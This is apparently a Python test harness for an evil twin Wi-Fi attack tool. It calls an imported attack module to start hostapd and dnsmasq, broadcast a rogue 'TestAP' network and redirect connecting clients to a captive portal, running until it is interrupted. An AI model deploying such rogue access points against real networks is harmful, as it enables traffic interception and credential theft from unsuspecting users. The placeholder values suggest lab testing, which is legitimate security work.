#!/usr/bin/env python3
import attack
import time

# Test attack configuration
ap_info = {
    'SSID': 'TestAP', 
    'Channel': 6,
    'BSSID': 'aa:bb:cc:dd:ee:ff'
}

print("🧪 Testing Evil Twin Attack Setup...")
print("=" * 50)

try:
    # Start the attack
    procs = attack.start_attack('ap0', ap_info)
    
    print("\n✅ Attack services started successfully!")
    print("Services running:")
    print(f"  - hostapd: PID {procs['hostapd'].pid}")
    print(f"  - dnsmasq: PID {procs['dnsmasq'].pid}")
    
    # Give it a moment to settle
    time.sleep(3)
    
    print("\n🔍 Testing captive portal...")
    print("You should now be able to:")
    print("1. See 'TestAP' in your WiFi networks")
    print("2. Connect to it and get redirected to captive portal")
    print("3. Test with: curl http://192.168.1.1")
    
    # Keep running
    print("\n⏳ Attack is running. Press Ctrl+C to stop...")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Stopping attack...")
        procs['hostapd'].terminate()
        procs['dnsmasq'].terminate()
        print("✅ Attack stopped.")
        
except Exception as e:
    print(f"❌ Error: {e}")
    import traceback
    traceback.print_exc()
